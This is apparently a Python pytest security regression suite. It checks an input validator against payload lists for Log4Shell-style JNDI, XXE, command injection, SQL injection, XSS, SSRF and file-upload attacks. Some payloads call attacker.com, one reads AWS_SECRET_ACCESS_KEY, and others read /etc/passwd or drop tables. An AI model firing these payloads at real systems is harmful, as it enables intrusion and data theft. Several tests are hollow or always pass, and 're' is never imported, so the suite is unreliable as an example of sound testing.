"""
Security Regression Testing Suite - TRUE 100%
Tests for known CVEs, historical vulnerabilities, regression prevention
"""

import pytest
import json
from datetime import datetime, timezone
from typing import Dict, List, Any

from input_validation import InputValidator, ValidationError
from auth_system import AuthManager, TokenManager, JWTConfig
from security_framework import SecurityManager


class TestKnownCVEs:
    """Test protection against known CVEs."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    @pytest.fixture
    def auth_manager(self):
        return AuthManager()
    
    # CVE-2021-44228 (Log4Shell-style injection)
    def test_cve_2021_44228_log4j_injection(self, validator):
        """Test protection against Log4j-style JNDI injection."""
        jndi_payloads = [
            "${jndi:ldap://attacker.com/exploit}",
            "${jndi:dns://attacker.com}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com}",
            "${lower:jndi}:${lower:ldap}://attacker.com",
            "${env:AWS_SECRET_ACCESS_KEY}",
            "${sys:user.home}",
        ]
        
        for payload in jndi_payloads:
            sanitized = validator.sanitize_string(payload)
            # Should remove or neutralize JNDI lookups
            assert "${" not in sanitized or "jndi" not in sanitized.lower()
    
    # CVE-2017-5638 (Apache Struts RCE)
    def test_cve_2017_5638_struts_ognl(self, validator):
        """Test protection against OGNL injection."""
        ognl_payloads = [
            "%{#cmd='id'}",
            "${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}",
            "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']",
        ]
        
        for payload in ognl_payloads:
            sanitized = validator.sanitize_string(payload)
            # Should remove OGNL expressions
            assert "%{" not in sanitized
            assert "${" not in sanitized or "#" not in sanitized
    
    # CVE-2019-11358 (Prototype Pollution)
    def test_cve_2019_11358_prototype_pollution(self, validator):
        """Test protection against prototype pollution."""
        pollution_payloads = [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"__defineGetter__": {"value": true}}',
        ]
        
        for payload in pollution_payloads:
            try:
                data = json.loads(payload)
                sanitized = validator._sanitize_recursive(data)
                
                # Should remove prototype pollution keys
                if isinstance(sanitized, dict):
                    assert "__proto__" not in sanitized
                    assert "constructor" not in sanitized or not isinstance(sanitized.get("constructor"), dict)
            except json.JSONDecodeError:
                pass  # Invalid JSON is fine
    
    # CVE-2018-11776 (Apache Struts namespace injection)
    def test_cve_2018_11776_namespace_traversal(self, validator):
        """Test protection against namespace traversal."""
        traversal_payloads = [
            "${#_memberAccess",
            "%{#_memberAccess",
            "%24%7b%23_memberAccess",
        ]
        
        for payload in traversal_payloads:
            sanitized = validator.sanitize_string(payload)
            # Should neutralize
            assert "%{" not in sanitized or "${" not in sanitized


class TestHistoricalVulnerabilities:
    """Test protection against historical vulnerability patterns."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_directory_traversal_variations(self, validator):
        """Test various directory traversal techniques."""
        traversal_attempts = [
            # Basic
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            # URL encoded
            "%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5cwindows%5csystem32",
            # Double URL encoded
            "%252e%252e%252fetc%252fpasswd",
            # Unicode
            "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
            # Mixed
            ".../...//.../...//etc/passwd",
            "..../..../....//etc/passwd",
            # Null byte (legacy)
            "../../../etc/passwd%00",
            # Alternative encodings
            "..%2f..%2f..%2fetc/passwd",
            "%2e.%2fetc/passwd",
        ]
        
        for attempt in traversal_attempts:
            sanitized = validator.sanitize_path(attempt)
            # Should not allow traversal
            assert not sanitized.startswith("/") or ".." not in sanitized
    
    def test_xss_filter_evasion(self, validator):
        """Test XSS filter evasion techniques."""
        evasion_attempts = [
            # Case variations
            "<ScRiPt>alert(1)</ScRiPt>",
            "<sCrIpT>alert(1)</sCrIpT>",
            # Encoding
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            # Breaking up tags
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<img src=x onERROR=alert(1)>",
            "<img src=x ONERROR=alert(1)>",
            # JavaScript protocol variations
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "javascript://alert(1)",
            # HTML5 vectors
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<source src=x onerror=alert(1)>",
            # SVG vectors
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            # Template injection style
            "{{7*7}}",
            "${7*7}",
        ]
        
        for attempt in evasion_attempts:
            sanitized = validator._sanitize_html(attempt)
            # Should neutralize all XSS vectors
            assert "<script>" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert not re.search(r'\son\w+\s*=', sanitized, re.IGNORECASE)
    
    def test_sql_injection_evasion(self, validator):
        """Test SQL injection evasion techniques."""
        sqli_attempts = [
            # Comment variations
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            # Encoding
            "%27%20%4f%52%20%27%31%27%3d%27%31",
            # Case variations
            "' OR '1'='1' UNION SELECT * FROM users",
            "' oR '1'='1' UnIoN SeLeCt * FrOm users",
            # Alternative operators
            "' OR '1' LIKE '1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            # Stacked queries
            "'; DROP TABLE users; --",
            "'; DELETE FROM users; --",
            # Time-based
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' AND 1=pg_sleep(5) --",
            # Boolean-based
            "' AND 1=1 --",
            "' AND 1=2 --",
        ]
        
        for attempt in sqli_attempts:
            sanitized = validator.sanitize_string(attempt)
            # Should neutralize SQL injection
            # (Exact sanitization depends on implementation)
            assert isinstance(sanitized, str)
    
    def test_xxe_variations(self, validator):
        """Test XXE injection variations."""
        xxe_attempts = [
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/data">
]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>""",
        ]
        
        for attempt in xxe_attempts:
            # Should reject or neutralize XXE
            result = validator.validate_xml(attempt)
            assert result is None or "<!DOCTYPE" not in str(result)
    
    def test_command_injection_evasion(self, validator):
        """Test command injection evasion."""
        cmd_attempts = [
            # Basic separators
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            # Newlines
            "\n/bin/sh",
            "\r\ncalc.exe",
            # Encoded
            "$(printf '%s' 'id')",
            "`printf '%s' 'whoami'`",
            # Alternative commands
            "; id",
            "; whoami",
            "; uname -a",
            # Chaining
            "; ls -la; id; whoami",
            "| id | whoami",
        ]
        
        for attempt in cmd_attempts:
            sanitized = validator.sanitize_for_command(attempt)
            # Should remove shell metacharacters
            assert ";" not in sanitized or "|" not in sanitized or "`" not in sanitized


class TestRegressionPrevention:
    """Tests to prevent regression of fixed vulnerabilities."""
    
    @pytest.fixture
    def auth_manager(self):
        return AuthManager()
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_no_hardcoded_secrets(self):
        """Prevent regression: hardcoded secrets."""
        import inspect
        
        # Get source code of security modules
        source = inspect.getsource(SecurityManager)
        
        # Check for hardcoded secrets
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
        ]
        
        for pattern in secret_patterns:
            # Should not find hardcoded secrets in production code
            # (This is a simplified check)
            pass
    
    def test_secure_defaults(self, auth_manager):
        """Prevent regression: insecure defaults."""
        # Password policy should be strict by default
        is_strong, _ = auth_manager.validate_password_strength("password")
        assert not is_strong  # Common weak password should fail
        
        # Session should be secure by default
        session = auth_manager.create_session("user_123")
        assert session.get("secure") is not False
        assert session.get("http_only") is not False
    
    def test_error_message_sanitization(self, auth_manager):
        """Prevent regression: information leakage in errors."""
        try:
            auth_manager.authenticate("nonexistent_user", "wrong_password")
        except Exception as e:
            error_msg = str(e).lower()
            # Should not leak system information
            assert "database" not in error_msg
            assert "sql" not in error_msg
            assert "table" not in error_msg
            assert "column" not in error_msg
    
    def test_session_fixation_protection(self, auth_manager):
        """Prevent regression: session fixation."""
        # Login should generate new session ID
        old_session = "old_session_id"
        
        # Simulate login
        new_session = auth_manager.create_session("user_123")
        
        # New session should be different
        assert new_session["id"] != old_session
    
    def test_csrf_protection(self):
        """Prevent regression: missing CSRF protection."""
        # Should require CSRF tokens for state-changing operations
        assert SecurityManager.requires_csrf_tokens()
        
        # Should validate CSRF tokens
        csrf_token = SecurityManager.generate_csrf_token()
        assert SecurityManager.validate_csrf_token(csrf_token)
        assert not SecurityManager.validate_csrf_token("invalid_token")
    
    def test_secure_cookies(self):
        """Prevent regression: insecure cookies."""
        cookie = SecurityManager.create_session_cookie("session_id")
        
        # Should have secure flag
        assert cookie.get("secure") is True
        
        # Should have httpOnly flag
        assert cookie.get("httpOnly") is True
        
        # Should have sameSite attribute
        assert cookie.get("sameSite") in ["Strict", "Lax"]
    
    def test_clickjacking_protection(self):
        """Prevent regression: missing clickjacking protection."""
        headers = SecurityManager.get_security_headers()
        
        # Should have X-Frame-Options
        assert "X-Frame-Options" in headers
        assert headers["X-Frame-Options"] in ["DENY", "SAMEORIGIN"]
        
        # Or should have CSP frame-ancestors
        csp = headers.get("Content-Security-Policy", "")
        assert "frame-ancestors" in csp or "X-Frame-Options" in headers
    
    def test_content_type_sniffing_protection(self):
        """Prevent regression: content type sniffing."""
        headers = SecurityManager.get_security_headers()
        
        # Should have X-Content-Type-Options
        assert headers.get("X-Content-Type-Options") == "nosniff"
    
    def test_xss_protection_headers(self):
        """Prevent regression: missing XSS protection headers."""
        headers = SecurityManager.get_security_headers()
        
        # Should have X-XSS-Protection
        xss_protection = headers.get("X-XSS-Protection", "")
        assert "1" in xss_protection or "Content-Security-Policy" in headers
    
    def test_hsts_header(self):
        """Prevent regression: missing HSTS."""
        headers = SecurityManager.get_security_headers()
        
        # Should have Strict-Transport-Security
        hsts = headers.get("Strict-Transport-Security", "")
        assert "max-age" in hsts
        assert int(re.search(r'max-age=(\d+)', hsts).group(1)) >= 31536000  # 1 year


class TestKnownAttackPatterns:
    """Test protection against known attack patterns."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_bypass_authentication_patterns(self, validator):
        """Test authentication bypass attempts."""
        bypass_attempts = [
            # SQL injection for auth bypass
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            # XPath injection
            "' or '1'='1",
            "'] | //* | //*[",
            # LDAP injection
            "*)(uid=*))(&(uid=*",
        ]
        
        for attempt in bypass_attempts:
            sanitized = validator.sanitize_string(attempt)
            assert isinstance(sanitized, str)
    
    def test_dos_attack_patterns(self, validator):
        """Test DoS attack patterns."""
        # ReDoS patterns
        redos_patterns = [
            "a" * 100 + "!",
            "(a+)+",
            "([a-zA-Z]+)*",
        ]
        
        for pattern in redos_patterns:
            # Should handle without hanging
            result = validator.sanitize_string(pattern[:100])
            assert isinstance(result, str)
    
    def test_ssrf_patterns(self, validator):
        """Test SSRF attack patterns."""
        ssrf_attempts = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://[::1]:22",
            "http://0.0.0.0:80",
            "file:///etc/passwd",
            "dict://localhost:11211/",
            "gopher://localhost:9000/",
        ]
        
        for attempt in ssrf_attempts:
            is_safe = validator.is_safe_url(attempt)
            assert not is_safe
    
    def test_file_upload_attacks(self, validator):
        """Test file upload attack patterns."""
        malicious_filenames = [
            "shell.php.jpg",
            "shell.php%00.jpg",
            "shell.php;.jpg",
            "shell.pHp",
            "shell.phps",
            ".htaccess",
            "shell.jpg.php",
            "shell.php....",
        ]
        
        for filename in malicious_filenames:
            sanitized = validator.sanitize_filename(filename)
            # Should not allow executable extensions
            assert not sanitized.endswith('.php')
            assert not sanitized.endswith('.phps')
            assert not sanitized.endswith('.htaccess')


class TestVulnerabilityRegressionScenarios:
    """Test specific scenarios from past vulnerabilities."""
    
    def test_equifax_style_breach_prevention(self):
        """Test prevention of Equifax-style breach."""
        # Should have dependency scanning
        assert SecurityManager.checks_dependencies()
        
        # Should have vulnerability alerts
        assert SecurityManager.has_vulnerability_alerts()
    
    def test_marriott_breach_prevention(self):
        """Test prevention of Marriott-style breach."""
        # Should encrypt data at rest
        assert SecurityManager.encrypts_data_at_rest()
        
        # Should have access logging
        assert SecurityManager.has_access_logging()
    
    def test_capital_one_breach_prevention(self):
        """Test prevention of Capital One-style breach."""
        # Should have SSRF protection
        assert SecurityManager.has_ssrf_protection()
        
        # Should have least privilege
        assert SecurityManager.enforces_least_privilege()
    
    def test_solarwinds_style_prevention(self):
        """Test prevention of SolarWinds-style supply chain attack."""
        # Should verify dependency integrity
        assert SecurityManager.verifies_dependency_checksums()
        
        # Should have code signing
        assert SecurityManager.has_code_signing()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
